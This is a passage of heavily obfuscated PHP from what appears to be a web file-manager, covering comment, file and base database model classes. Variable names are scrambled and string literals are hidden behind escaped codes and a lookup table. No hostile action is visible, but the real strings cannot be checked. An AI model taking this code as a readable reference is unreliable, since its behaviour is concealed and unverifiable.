"\122\x49\107\110\124\40\x4a\117\x49\116\x20{$this->tablePrefix}\143\x6f\x6d\x6d\145\x6e\x74\x5f\x70\162\x61\151\x73\145\40\163\x74\141\162\40\157\x6e\x20\143\157\x6d\155\x65\156\164\x2e\143\x6f\155\155\145\x6e\164\x49\x44\40\x3d\x20\163\164\141\x72\56\143\157\x6d\155\145\156\164\x49\104"; $‡şş¡£Ó = $this->alias($×Øó—œ€[440])->where($û™Ş“®°)->join($Âºú¦¡, $×Øó—œ€[2016])->count(); $¼Ìêß› = array($×Øó—œ€[2017] => $”¨£ßË¸, $×Øó—œ€[2018] => $‡şş¡£Ó); return $¼Ìêß›; } public function listData($üıî§Ó¦) { $‡¤›”›® =& $_SERVER[±³—úê]; if (isset($üıî§Ó¦[$‡¤›”›®[2019]])) { if ($üıî§Ó¦[$‡¤›”›®[2019]]) { $üıî§Ó¦[$‡¤›”›®[2012]] = array($‡¤›”›®[1093], intval($üıî§Ó¦[$‡¤›”›®[2019]])); } unset($üıî§Ó¦[$‡¤›”›®[2019]]); } if (isset($üıî§Ó¦[$‡¤›”›®[2020]])) { if ($üıî§Ó¦[$‡¤›”›®[2020]]) { $üıî§Ó¦[$‡¤›”›®[2012]] = array($‡¤›”›®[1090], intval($üıî§Ó¦[$‡¤›”›®[2020]])); } unset($üıî§Ó¦[$‡¤›”›®[2020]]); } return $this->_listData($üıî§Ó¦); } private function _listData($çîüÓÅ) { $¤€ÒÅ«Í =& $_SERVER[±³—úê]; $Ú¶ü•­Ø = $this->where($çîüÓÅ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ú¶ü•­Ø[$¤€ÒÅ«Í[456]]); $this->_listAppendUser($Ú¶ü•­Ø[$¤€ÒÅ«Í[456]]); $this->_listAppendMeta($Ú¶ü•­Ø[$¤€ÒÅ«Í[456]]); return $Ú¶ü•­Ø; } private function _makeOrder() { $„¢€÷ß =& $_SERVER[±³—úê]; $Ó½öÉ÷¦ = array($„¢€÷ß[2007], $„¢€÷ß[2006], $„¢€÷ß[243]); $æû¯•Ø• = Input::get($„¢€÷ß[541], $„¢€÷ß[7], $„¢€÷ß[508], $Ó½öÉ÷¦); $æÈ™†’® = Input::get($„¢€÷ß[542], $„¢€÷ß[7], $„¢€÷ß[1768], array($„¢€÷ß[2021], $„¢€÷ß[537])); $àÙ†˜¶÷ = $æû¯•Ø• . $„¢€÷ß[53] . $æÈ™†’®; return $this->order($àÙ†˜¶÷); } private function _listAppendParent(&$©“½”ˆ) { $Á‰€Üş“ =& $_SERVER[±³—úê]; $ÃÜš£±ı = array_unique(array_to_keyvalue($©“½”ˆ, $Á‰€Üş“[12], $Á‰€Üş“[2004])); $ÃÜš£±ı = array_remove_value($ÃÜš£±ı, $Á‰€Üş“[240]); if (!$ÃÜš£±ı) { return; } $•ƒ¿Œ² = $this->where(array($Á‰€Üş“[2005] => array($Á‰€Üş“[7], $ÃÜš£±ı)))->select(); $•ƒ¿Œ² = array_to_keyvalue($•ƒ¿Œ², $Á‰€Üş“[2012]); foreach ($©“½”ˆ as &$ÖÂÖÊĞ) { if (isset($•ƒ¿Œ²[$ÖÂÖÊĞ[$Á‰€Üş“[2004]]])) { $ÖÂÖÊĞ[$Á‰€Üş“[2022]] = $•ƒ¿Œ²[$ÖÂÖÊĞ[$Á‰€Üş“[2004]]]; } } unset($ÖÂÖÊĞ); } private function _listAppendUser(&$œÆ¥‘í˜) { $Ä€à÷Ç =& $_SERVER[±³—úê]; $û„×ÓÓÌ = array_unique(array_to_keyvalue($œÆ¥‘í˜, $Ä€à÷Ç[12], $Ä€à÷Ç[1775])); $û„×ÓÓÌ = array_remove_value($û„×ÓÓÌ, $Ä€à÷Ç[240]); if (count($û„×ÓÓÌ) == 0) { return; } foreach ($œÆ¥‘í˜ as $¼Şêú¬) { if (isset($¼Şêú¬[$Ä€à÷Ç[2022]])) { $û„×ÓÓÌ[] = $¼Şêú¬[$Ä€à÷Ç[2022]][$Ä€à÷Ç[1775]]; } } $¼êªëüà = Model($Ä€à÷Ç[608])->userListInfo($û„×ÓÓÌ); foreach ($œÆ¥‘í˜ as &$¼Şêú¬) { $¼Şêú¬[$Ä€à÷Ç[676]] = $¼êªëüà[$¼Şêú¬[$Ä€à÷Ç[1775]]]; if (isset($¼Şêú¬[$Ä€à÷Ç[2022]])) { $¼Şêú¬[$Ä€à÷Ç[2022]][$Ä€à÷Ç[676]] = $¼êªëüà[$¼Şêú¬[$Ä€à÷Ç[2022]][$Ä€à÷Ç[1775]]]; } } unset($¼Şêú¬); } private function _listAppendMeta(&$È©²ˆºÍ) { $ˆ®¹ëÖ¬ =& $_SERVER[±³—úê]; $¨‹•£¯Ù = array_unique(array_to_keyvalue($È©²ˆºÍ, $ˆ®¹ëÖ¬[12], $ˆ®¹ëÖ¬[2012])); $¨‹•£¯Ù = array_remove_value($¨‹•£¯Ù, $ˆ®¹ëÖ¬[240]); if (!$¨‹•£¯Ù) { return; } foreach ($È©²ˆºÍ as $¯²òÑµÖ) { if (isset($¯²òÑµÖ[$ˆ®¹ëÖ¬[2022]])) { $¨‹•£¯Ù[] = $¯²òÑµÖ[$ˆ®¹ëÖ¬[2022]][$ˆ®¹ëÖ¬[2012]]; } } $÷ş¯‹¨¼ = $this->metaList($¨‹•£¯Ù); if (!$÷ş¯‹¨¼) { return !1; } foreach ($È©²ˆºÍ as &$¯²òÑµÖ) { $¯²òÑµÖ[$ˆ®¹ëÖ¬[550]] = $÷ş¯‹¨¼[$¯²òÑµÖ[$ˆ®¹ëÖ¬[2012]]]; if (isset($¯²òÑµÖ[$ˆ®¹ëÖ¬[2022]])) { $¯²òÑµÖ[$ˆ®¹ëÖ¬[2022]][$ˆ®¹ëÖ¬[550]] = $÷ş¯‹¨¼[$¯²òÑµÖ[$ˆ®¹ëÖ¬[2022]][$ˆ®¹ëÖ¬[2012]]]; } } unset($¯²òÑµÖ); } private function metaList($²…¿) { $£†íõöÙ =& $_SERVER[±³—úê]; if (!$²…¿) { return array(); } $£ëèÎğ = array($£†íõöÙ[2012] => array($£†íõöÙ[7], $²…¿)); $şüÓ¶›ß = Model($£†íõöÙ[2023])->where($£ëèÎğ)->select(); $şüÓ¶›ß = array_to_keyvalue_group($şüÓ¶›ß, $£†íõöÙ[2012]); foreach ($şüÓ¶›ß as $Ô§ù“áÔ => $Ü‰Úê±) { $¤½Õüç = array(); foreach ($Ü‰Úê± as $ãÕ‚Ø®¾) { $¤½Õüç[$ãÕ‚Ø®¾[$£†íõöÙ[97]]] = $ãÕ‚Ø®¾[$£†íõöÙ[461]]; } $şüÓ¶›ß[$Ô§ù“áÔ] = $¤½Õüç; } return $şüÓ¶›ß ? $şüÓ¶›ß : array(); } public function removeTarget($ì¯‡ßİí, $°„ü„ıÃ) { $‘¿·íÖ =& $_SERVER[±³—úê]; if (!$°„ü„ıÃ) { return !0; } $°„ü„ıÃ = is_array($°„ü„ıÃ) ? $°„ü„ıÃ : array($°„ü„ıÃ); $ëœçƒö— = array($‘¿·íÖ[190] => $ì¯‡ßİí, $‘¿·íÖ[580] => array($‘¿·íÖ[7], $°„ü„ıÃ)); $Â¯ˆğÎ… = $this->field($‘¿·íÖ[2012])->where($ëœçƒö—)->select(); $ºÆ½Ö£¬ = array_to_keyvalue($Â¯ˆğÎ…, $‘¿·íÖ[12], $‘¿·íÖ[2012]); if (!$ºÆ½Ö£¬) { return !0; } $ëœçƒö— = array($‘¿·íÖ[2012] => array($‘¿·íÖ[7], $ºÆ½Ö£¬)); $this->where($ëœçƒö—)->delete(); Model($‘¿·íÖ[2015])->where($ëœçƒö—)->delete(); Model($‘¿·íÖ[2024])->where($ëœçƒö—)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\154\x65\x5f\x63\x6f\x6e\164\145\x6e\x74\x73"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\124\x69\155\x65", "\x74\x69\155\x65", "\x69\x6e\x73\145\x72\164", "\x66\x75\156\143\164\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\145"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\155\x65" => "\151\x6f\x5f\x66\151\154\x65\137\155\145\164\141", "\155\x65\x74\x61\106\151\x65\154\144" => "\146\x69\154\145\111\x44"); public function fileInfo($•âÖ¡Š†) { $’ı÷ó­Â =& $_SERVER[±³—úê]; static $Ş©¼Ç˜Ù = array(); if (!isset($Ş©¼Ç˜Ù[$•âÖ¡Š†])) { $­’ï²š = $’ı÷ó­Â[2025]; $ü¸¬ÃûÂ = Model($’ı÷ó­Â[555])->field($­’ï²š)->where(array($’ı÷ó­Â[553] => $•âÖ¡Š†))->find(); $Ş©¼Ç˜Ù[$•âÖ¡Š†] = $ü¸¬ÃûÂ; } return $Ş©¼Ç˜Ù[$•âÖ¡Š†]; } public function addFileByContent($×í¢‘¬¨ = '', $òñ³å¯¨ = '') { $×ÚéÂª‹ =& $_SERVER[±³—úê]; $ÚŸ”Õè– = TEMP_PATH . $×ÚéÂª‹[2026]; if (!is_dir($ÚŸ”Õè–)) { mk_dir($ÚŸ”Õè–); } $Ü’šÉ©â = $ÚŸ”Õè– . $×ÚéÂª‹[2027] . rand_string(16); file_put_contents($Ü’šÉ©â, $×í¢‘¬¨); $¯™ğØ“Œ = $this->addFile($Ü’šÉ©â, $òñ³å¯¨, !0); if (file_exists($Ü’šÉ©â)) { @unlink($Ü’šÉ©â); } return $¯™ğØ“Œ; } public function createFileName($ÔĞèÊØ, $¯¾±ò¯Ÿ = false, $’•×°©Ó = false) { $¨‹è·° =& $_SERVER[±³—úê]; $ßÀ·Ğ«Ñ = IO::init($¨‹è·°[8]); $ú‘²õ  = $this->makeFilePath($ÔĞèÊØ, $ßÀ·Ğ«Ñ, $¯¾±ò¯Ÿ, $’•×°©Ó); $²¬Ö¨ÒÓ = $ßÀ·Ğ«Ñ->pathFather($ú‘²õ ); static $€´‡³ªş = false; $ûÙÆ¸Ğú = $¨‹è·°[2028] . md5($²¬Ö¨ÒÓ); if (!$€´‡³ªş && !Cache::get($ûÙÆ¸Ğú)) { $€´‡³ªş = !0; $ï¡¡åî¸ = IO::mkdir($²¬Ö¨ÒÓ); if (!IO::exist($ï¡¡åî¸ . $¨‹è·°[878])) { IO::mkfile($ï¡¡åî¸ . $¨‹è·°[878]); } Cache::set($ûÙÆ¸Ğú, 1, 3600 * 2); } return $ú‘²õ ; } public function makeFilePath($¤ı½ Ú, $ôúÆãñâ, $¢†éîîÓ = false, $î˜Ìøğ = false) { $ŒÁÕÑŞ¸ =& $_SERVER[±³—úê]; $Æ·†ıªò = Model($ŒÁÕÑŞ¸[850])->get($ŒÁÕÑŞ¸[2029]); $´·£×Û = KodIO::defaultIO() . date($ŒÁÕÑŞ¸[2030]); $óûÕÅò¦ = $´·£×Û . rand_string(5) . short_id(100); $¤ı½ Ú = str_replace($ŒÁÕÑŞ¸[8], $ŒÁÕÑŞ¸[11], KodIO::clear($¤ı½ Ú)); $İ÷ßš«¶ = $ôúÆãñâ->ext($¤ı½ Ú); if (!$¤ı½ Ú) { $Æ·†ıªò = $ŒÁÕÑŞ¸[856]; } switch ($Æ·†ıªò) { case $ŒÁÕÑŞ¸[2031]: if ($İ÷ßš«¶) { $óûÕÅò¦ = $óûÕÅò¦ . $ŒÁÕÑŞ¸[10] . $İ÷ßš«¶; } if ($İ÷ßš«¶ == $ŒÁÕÑŞ¸[1967]) { $óûÕÅò¦ .= $ŒÁÕÑŞ¸[1293]; } break; case $ŒÁÕÑŞ¸[2032]: $•±µ×œ = Model($ŒÁÕÑŞ¸[850])->get($ŒÁÕÑŞ¸[851]); $ŠÃê¥éù = substr(md5($ŒÁÕÑŞ¸[852] . $•±µ×œ . date($ŒÁÕÑŞ¸[829])), 0, 8); $¶…úì› = KodIO::defaultDriver(); $´·£×Û = $ŒÁÕÑŞ¸[1324] . $¶…úì›[$ŒÁÕÑŞ¸[486]] . $ŒÁÕÑŞ¸[495] . date($ŒÁÕÑŞ¸[2033]) . $ŠÃê¥éù . $ŒÁÕÑŞ¸[8]; if ($İ÷ßš«¶ == $ŒÁÕÑŞ¸[1967]) { $¤ı½ Ú .= $ŒÁÕÑŞ¸[1293]; } $ğƒÖö¤ = $ŒÁÕÑŞ¸[2034] . $´·£×Û . $¤ı½ Ú; CacheLock::lock($ğƒÖö¤); $óûÕÅò¦ = $´·£×Û . $¤ı½ Ú; if (IO::exist($´·£×Û . $¤ı½ Ú)) { $“Äá¤æ‘ = substr($¤ı½ Ú, 0, strlen($¤ı½ Ú) - strlen($İ÷ßš«¶)); $Üî…Ä = $î˜Ìøğ ? substr($î˜Ìøğ, 0, 5) : ($¢†éîîÓ ? substr($¢†éîîÓ, 0, 5) : rand_string(5)); $óûÕÅò¦ = $´·£×Û . $“Äá¤æ‘ . $Üî…Ä; if ($İ÷ßš«¶) { $óûÕÅò¦ = $óûÕÅò¦ . $ŒÁÕÑŞ¸[10] . $İ÷ßš«¶; } } if (IO::isOsDriver($óûÕÅò¦) && !IO::isUploadServer($óûÕÅò¦)) { if (IO::exist($óûÕÅò¦)) { CacheLock::unlock($ğƒÖö¤); return $óûÕÅò¦; } $Ó°ÜÅ„ä = IO::setContent($óûÕÅò¦, $ŒÁÕÑŞ¸[12]); if (!$Ó°ÜÅ„ä) { show_json($ŒÁÕÑŞ¸[2035], !1); } } CacheLock::unlock($ğƒÖö¤); break; case $ŒÁÕÑŞ¸[856]: break; default: break; } return $óûÕÅò¦; } public function addFileByRemote($Æ–®öö×, $ìèºˆ™, $õÛ¨íÍ¤ = array()) { $Ë¤æí³ =& $_SERVER[±³—úê]; if (!IO::exist($Æ–®öö×)) { return !1; } $şÌ¸¬ = $õÛ¨íÍ¤[$Ë¤æí³[558]] ? $õÛ¨íÍ¤[$Ë¤æí³[558]] : $Ë¤æí³[12]; $°ê¾ƒç• = IO::hashMd5($Æ–®öö×, $şÌ¸¬); $¢º”…Ë = KodIO::defaultDriver(); $ªØ©ÀÃç = array($Ë¤æí³[631] => IO::size($Æ–®öö×), $Ë¤æí³[2036] => 1, $Ë¤æí³[505] => $ìèºˆ™, $Ë¤æí³[889] => $¢º”…Ë[$Ë¤æí³[486]], $Ë¤æí³[506] => $Æ–®öö×, $Ë¤æí³[2037] => $õÛ¨íÍ¤[$Ë¤æí³[686]] ? $õÛ¨íÍ¤[$Ë¤æí³[686]] : IO::hashSimple($Æ–®öö×), $Ë¤æí³[2038] => $°ê¾ƒç• ? $°ê¾ƒç• : $şÌ¸¬); if ($‹Ç¬ƒÊ = $this->addFileCheckExist($ªØ©ÀÃç[$Ë¤æí³[686]], $ªØ©ÀÃç[$Ë¤æí³[558]], $ªØ©ÀÃç[$Ë¤æí³[79]])) { return $‹Ç¬ƒÊ; } return $this->addFileData($ªØ©ÀÃç); } private function addFileData($ì÷áŠ–ú) { $ÆŠ‰ì²ô =& $_SERVER[±³—úê]; if (!$ì÷áŠ–ú) { return !1; } $ì÷áŠ–ú[$ÆŠ‰ì²ô[79]] = intval($ì÷áŠ–ú[$ÆŠ‰ì²ô[79]]); if (!$ì÷áŠ–ú[$ÆŠ‰ì²ô[79]] && strlen($ì÷áŠ–ú[$ÆŠ‰ì²ô[686]]) > 32) { $ì÷áŠ–ú[$ÆŠ‰ì²ô[79]] = intval(substr($ì÷áŠ–ú[$ÆŠ‰ì²ô[686]], 32)); } $“ëÛ»¿‹ = $this->add($ì÷áŠ–ú); return $this->find($“ëÛ»¿‹); } public function addFile($úÚÀ“ËŸ, $Òìµ“ëî, $Ïä¾š©± = false) { $ÏàıƒĞÚ =& $_SERVER[±³—úê]; $¬£ÑùÁû = IO::hashSimple($úÚÀ“ËŸ); $’©’æä» = IO::size($úÚÀ“ËŸ); $ô¶Ö¬û = $’©’æä» <= 1024 * 1024 * 10 ? IO::hashMd5($úÚÀ“ËŸ) : $ÏàıƒĞÚ[12]; $àŸ’ÖÃµ = $ÏàıƒĞÚ[2039] . $¬£ÑùÁû; CacheLock::lock($àŸ’ÖÃµ); if ($ô¶Ö¬û && $¬£ÑùÁû) { $–Ñ‚Ìö = $this->addFileCheckExist($¬£ÑùÁû, $ô¶Ö¬û, $’©’æä»); if ($–Ñ‚Ìö) { CacheLock::unlock($àŸ’ÖÃµ); return $–Ñ‚Ìö; } } $×ãçÂÀ‚ = $this->addFileMake($úÚÀ“ËŸ, $’©’æä», $¬£ÑùÁû, $ô¶Ö¬û, $Òìµ“ëî, $Ïä¾š©±); $†ß÷õàÓ = $this->addFileData($×ãçÂÀ‚); CacheLock::unlock($àŸ’ÖÃµ); if (!$ô¶Ö¬û && $†ß÷õàÓ) { $this->fileMd5Check($†ß÷õàÓ); } return $†ß÷õàÓ; } public function fileMd5Check($¨ÁŸƒÅ) { $ú½Â½ÂÄ =& $_SERVER[±³—úê]; $ãïğƒò­ = array($¨ÁŸƒÅ[$ú½Â½ÂÄ[552]], $¨ÁŸƒÅ[$ú½Â½ÂÄ[87]]); $ìãè°¸ = $ú½Â½ÂÄ[2040] . $¨ÁŸƒÅ[$ú½Â½ÂÄ[87]]; $ÖÏÈ‚¹ = $ú½Â½ÂÄ[2041] . $¨ÁŸƒÅ[$ú½Â½ÂÄ[552]]; TaskQueue::add($ú½Â½ÂÄ[2042], $ãïğƒò­, $ìãè°¸, $ÖÏÈ‚¹); } public function fileMd5Set($ßÅòıÓŠ, $“Ê½Á¢¿) { $é‹ñæâ³ =& $_SERVER[±³—úê]; $ß‡İ¯Î» = $this->find($ßÅòıÓŠ); if (!$ß‡İ¯Î» || $ß‡İ¯Î»[$é‹ñæâ³[558]]) { return; } $ÙòöƒÉË = IO::hashMd5($“Ê½Á¢¿); if (!$ÙòöƒÉË) { return $é‹ñæâ³[12]; } $this->where(array($é‹ñæâ³[552] => $ßÅòıÓŠ))->save(array($é‹ñæâ³[558] => $ÙòöƒÉË)); } public function addFileMake($Àô¶, $ƒ“®Ü, $ú…¬˜Ô, $éØá£æí, $‚Ñ‰ÔÃÂ, $À¹ŸÖäÛ) { $¸ì‚Ü¢ =& $_SERVER[±³—úê]; $óº¦™’ = $this->createFileName($‚Ñ‰ÔÃÂ, $ú…¬˜Ô, $éØá£æí); $úÔ÷Ğ¹ = get_path_father($óº¦™’); $®çşÙù = get_path_this($óº¦™’); if ($À¹ŸÖäÛ) { $¯ñ¨í­Õ = IO::move($Àô¶, $úÔ÷Ğ¹, !1, $®çşÙù); } else { $¯ñ¨í­Õ = IO::copy($Àô¶, $úÔ÷Ğ¹, !1, $®çşÙù); } if (!$¯ñ¨í­Õ) { return !1; } $ùÔÍ¡† = KodIO::defaultDriver(); $Æšêø¶ = array($¸ì‚Ü¢[631] => $ƒ“®Ü, $¸ì‚Ü¢[2036] => 1, $¸ì‚Ü¢[505] => $‚Ñ‰ÔÃÂ, $¸ì‚Ü¢[889] => $ùÔÍ¡†[$¸ì‚Ü¢[486]], $¸ì‚Ü¢[506] => $óº¦™’, $¸ì‚Ü¢[2037] => $ú…¬˜Ô, $¸ì‚Ü¢[2038] => $éØá£æí); return $Æšêø¶; } public function addFileCheckExist($Àƒ¯ÎšÁ, $ŸŒ¢ãè, $¼€µ•È) { $„¤’àÅã =& $_SERVER[±³—úê]; $ ËÎ„È§ = $this->findByHash($Àƒ¯ÎšÁ, $ŸŒ¢ãè); if (!$ ËÎ„È§) { return !1; } $£ûœ“àı = array($„¤’àÅã[2036] => intval($ ËÎ„È§[$„¤’àÅã[2043]]) + 1, $„¤’àÅã[631] => $¼€µ•È); $this->where(array($„¤’àÅã[553] => $ ËÎ„È§[$„¤’àÅã[552]]))->save($£ûœ“àı); return $ ËÎ„È§; } public function remove($Œ”•ËÓ´) { $this->linkCountChange($Œ”•ËÓ´, !1); $this->clearEmpty(); return !0; } public function linkAdd($òıõ§„¥) { $this->linkCountChange($òıõ§„¥, !0); } public function linkCountChange($Ê€–”, $øÇã€â») { $Ú´Òæ²è =& $_SERVER[±³—úê]; if (!$Ê€–”) { return; } if (!is_array($Ê€–”)) { $Ê€–” = array($Ê€–”); } $ÃÏÛõ©Ó = array(); foreach ($Ê€–” as $³ƒêˆ€Ñ) { $ğ°¬³‹‚ = $³ƒêˆ€Ñ . $Ú´Òæ²è[12]; if (!$ÃÏÛõ©Ó[$ğ°¬³‹‚]) { $ÃÏÛõ©Ó[$ğ°¬³‹‚] = 0; } $ÃÏÛõ©Ó[$ğ°¬³‹‚]++; } $ĞôèŠò = array(); foreach ($ÃÏÛõ©Ó as $³ƒêˆ€Ñ => $šÓİ¨´Î) { $ğ°¬³‹‚ = $šÓİ¨´Î . $Ú´Òæ²è[12]; if (!$ĞôèŠò[$ğ°¬³‹‚]) { $ĞôèŠò[$ğ°¬³‹‚] = array(); } $ĞôèŠò[$ğ°¬³‹‚][] = $³ƒêˆ€Ñ; } foreach ($ĞôèŠò as $šÓİ¨´Î => $åŸıßŞÄ) { if (!$åŸıßŞÄ) { continue; } $šÓİ¨´Î = $øÇã€â» ? $šÓİ¨´Î : -intval($šÓİ¨´Î); $Æè÷ı‹˜ = array($Ú´Òæ²è[552] => array($Ú´Òæ²è[7], $åŸıßŞÄ)); if ($šÓİ¨´Î < 0) { $Æè÷ı‹˜[$Ú´Òæ²è[2043]] = array($Ú´Òæ²è[1094], abs($šÓİ¨´Î)); } $this->where($Æè÷ı‹˜)->setAdd($Ú´Òæ²è[2043], $šÓİ¨´Î); } } public function findByHash($œ™¬½ƒ›, $ÁÓ‡·è = false) { $ó°¶ÍÈ =& $_SERVER[±³—úê]; if (!$œ™¬½ƒ› && !$ÁÓ‡·è) { return !1; } $û½”åƒÄ = array($ó°¶ÍÈ[2037] => $œ™¬½ƒ›); if ($ÁÓ‡·è) { $û½”åƒÄ = array($ó°¶ÍÈ[2038] => $ÁÓ‡·è); } return $this->order($ó°¶ÍÈ[2044])->where($û½”åƒÄ)->find(); } public function clearEmpty($ç÷¶å÷ˆ = 1) { $‹ßš–Œ£ =& $_SERVER[±³—úê]; $°Üš‚ë¢ = time() - 3600 * 24 * $ç÷¶å÷ˆ; $ÆšºãÆ = $‹ßš–Œ£[2045] . $°Üš‚ë¢; $ß•Ò™ş = $this->where($ÆšºãÆ)->select(); if (!$ß•Ò™ş) { return; } $·©áö—¯ = new Task($‹ßš–Œ£[2046], $‹ßš–Œ£[12], count($ß•Ò™ş)); foreach ($ß•Ò™ş as $Ú™íÇŸ¸) { $·©áö—¯->update(1); $this->resetFile($Ú™íÇŸ¸); } $·©áö—¯->end(); } public function resetFile($»«î¦Å¸) { $óŸ”Ä¬÷ =& $_SERVER[±³—úê]; $Ì»“¢œ = array($óŸ”Ä¬÷[553] => $»«î¦Å¸[$óŸ”Ä¬÷[552]]); $™˜’ÖÕ = Model($óŸ”Ä¬÷[1423])->where($Ì»“¢œ)->count(); $Å°ô’¨ñ = Model($óŸ”Ä¬÷[2047])->where($Ì»“¢œ)->count(); $ğêğËÓ = intval($™˜’ÖÕ) + intval($Å°ô’¨ñ); if ($ğêğËÓ == 0) { IO::remove($»«î¦Å¸[$óŸ”Ä¬÷[87]]); Model($óŸ”Ä¬÷[2048])->delete($»«î¦Å¸[$óŸ”Ä¬÷[552]]); $this->where($Ì»“¢œ)->delete(); $this->metaSet($»«î¦Å¸[$óŸ”Ä¬÷[552]], null, null); write_log(ACTION . $óŸ”Ä¬÷[2049] . KodUser::id() . $óŸ”Ä¬÷[2050] . $»«î¦Å¸[$óŸ”Ä¬÷[552]] . $óŸ”Ä¬÷[2051] . $»«î¦Å¸[$óŸ”Ä¬÷[79]] . $óŸ”Ä¬÷[201] . $»«î¦Å¸[$óŸ”Ä¬÷[87]], $óŸ”Ä¬÷[2052]); return; } if ($»«î¦Å¸[$óŸ”Ä¬÷[2043]] != $ğêğËÓ) { $this->where($Ì»“¢œ)->save(array($óŸ”Ä¬÷[2036] => $ğêğËÓ)); } } public function storageInfo($îäŠßÜ = false) { $¿´ñãä¤ =& $_SERVER[±³—úê]; $­ÍÒôæ = $this->count() + 0.0; $ é§Ú­Ê = 0; $§÷ÉöàÂ = 1; $ğÎš«¢ú = 0; $‘õ‰×Ş„ = 5000; for ($Ãò×æøõ = 0; $Ãò×æøõ < $­ÍÒôæ; $Ãò×æøõ = $Ãò×æøõ + $‘õ‰×Ş„) { $È¹Â µÍ = $this->limit($Ãò×æøõ, $Ãò×æøõ + $‘õ‰×Ş„)->select(); foreach ($È¹Â µÍ as $ßì‰™† ) { $§÷ÉöàÂ += $ßì‰™† [$¿´ñãä¤[79]] * $ßì‰™† [$¿´ñãä¤[2043]]; $ é§Ú­Ê += $ßì‰™† [$¿´ñãä¤[79]] * ($ßì‰™† [$¿´ñãä¤[2043]] - 1); $ğÎš«¢ú += $ßì‰™† [$¿´ñãä¤[2043]]; } } $®Ì…Ï»® = array($¿´ñãä¤[2053] => $§÷ÉöàÂ, $¿´ñãä¤[2054] => $ é§Ú­Ê, $¿´ñãä¤[2055] => $ é§Ú­Ê / $§÷ÉöàÂ, $¿´ñãä¤[83] => $­ÍÒôæ, $¿´ñãä¤[2056] => $ğÎš«¢ú); return $®Ì…Ï»®; } } goto C‰Ü‰’À; DËàÕ¼ÎÀõ: define($_SERVER[±³—úê][330], 0); define($_SERVER[±³—úê][331], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\157\162\144\x65\162", "\141\x6c\x69\141\163", "\150\x61\x76\x69\156\147", "\147\x72\x6f\165\160", "\x6c\157\143\x6b", "\x64\151\163\x74\x69\x6e\143\164", "\x61\165\164\157", "\146\x69\x6c\x74\x65\x72", "\x76\x61\154\151\144\x61\x74\145", "\x72\145\x73\x75\x6c\x74", "\x62\x69\156\x64", "\164\x6f\x6b\x65\x6e"); public function __construct($¡£”Ş¥Ö = '', $¬‚‰Ù¥  = '', $ãèÎ•Ò = '') { $¦„¬ñ™Å =& $_SERVER[±³—úê]; $this->_initialize(); if (!empty($¡£”Ş¥Ö)) { if (strpos($¡£”Ş¥Ö, $¦„¬ñ™Å[10])) { list($this->dbName, $this->name) = explode($¦„¬ñ™Å[10], $¡£”Ş¥Ö); } else { $this->name = $¡£”Ş¥Ö; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¬‚‰Ù¥ )) { $this->tablePrefix = $¦„¬ñ™Å[12]; } elseif ($¦„¬ñ™Å[12] != $¬‚‰Ù¥ ) { $this->tablePrefix = $¬‚‰Ù¥ ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¦„¬ñ™Å[332]); } $this->db(0, empty($this->connection) ? $ãèÎ•Ò : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÍèøÔ‹• =& $_SERVER[±³—úê]; if (empty($this->fields)) { if (think_config($ÍèøÔ‹•[333])) { $³ı¥ØåÙ = $this->dbName ? $this->dbName : think_config($ÍèøÔ‹•[334]); $²¡Š‰ƒ– = think_var_cache($ÍèøÔ‹•[335] . strtolower(get_path_this($³ı¥ØåÙ) . $ÍèøÔ‹•[10] . $this->name)); if ($²¡Š‰ƒ–) { $£È°ÒÑ§ = think_config($ÍèøÔ‹•[336]); if (empty($£È°ÒÑ§) || $²¡Š‰ƒ–[$ÍèøÔ‹•[337]] == $£È°ÒÑ§) { $this->fields = $²¡Š‰ƒ–; return; } } } $this->flush(); } } public function flush() { $áÄÔ×Š =& $_SERVER[±³—úê]; $this->db->setModel($this->name); $µ–×şğ = $this->db->getFields($this->getTableName()); if (!$µ–×şğ) { return !1; } $this->fields = array_keys($µ–×şğ); $this->fields[$áÄÔ×Š[338]] = !1; foreach ($µ–×şğ as $‹íÕÒ×‚ => $—“»ğÚŠ) { $¨Îª“¦­[$‹íÕÒ×‚] = $—“»ğÚŠ[$áÄÔ×Š[33]]; if ($—“»ğÚŠ[$áÄÔ×Š[39]]) { $this->fields[$áÄÔ×Š[339]] = $‹íÕÒ×‚; if ($—“»ğÚŠ[$áÄÔ×Š[42]]) { $this->fields[$áÄÔ×Š[338]] = !0; } } } $this->fields[$áÄÔ×Š[340]] = $¨Îª“¦­; if (think_config($áÄÔ×Š[336])) { $this->fields[$áÄÔ×Š[337]] = think_config($áÄÔ×Š[336]); } if (think_config($áÄÔ×Š[333])) { $·†¡æÆÆ = $this->dbName ? $this->dbName : think_config($áÄÔ×Š[334]); think_var_cache($áÄÔ×Š[335] . strtolower(get_path_this($·†¡æÆÆ) . $áÄÔ×Š[10] . $this->name), $this->fields); } } public function switchModel($ŞöŸ¶å´, $ÂÒ§ºıê = array()) { $Ú“œ‘× =& $_SERVER[±³—úê]; $Ãä‘›ñ = ucwords(strtolower($ŞöŸ¶å´)) . $Ú“œ‘×[341]; if (!class_exists($Ãä‘›ñ)) { think_exception($Ãä‘›ñ . think_lang($Ú“œ‘×[342])); } $this->_extModel = new $Ãä‘›ñ($this->name); if (!empty($ÂÒ§ºıê)) { foreach ($ÂÒ§ºıê as $õ³Ÿû¥) { $this->_extModel->setProperty($õ³Ÿû¥, $this->{$õ³Ÿû¥}); } } return $this->_extModel; } public function __set($åÈ‘½øí, $­”çßĞ¯) { $this->data[$åÈ‘½øí] = $­”çßĞ¯; } public function __get($şÙü©™à) { return isset($this->data[$şÙü©™à]) ? $this->data[$şÙü©™à] : null; } public function __isset($†şÕæ­) { return isset($this->data[$†şÕæ­]); } public function 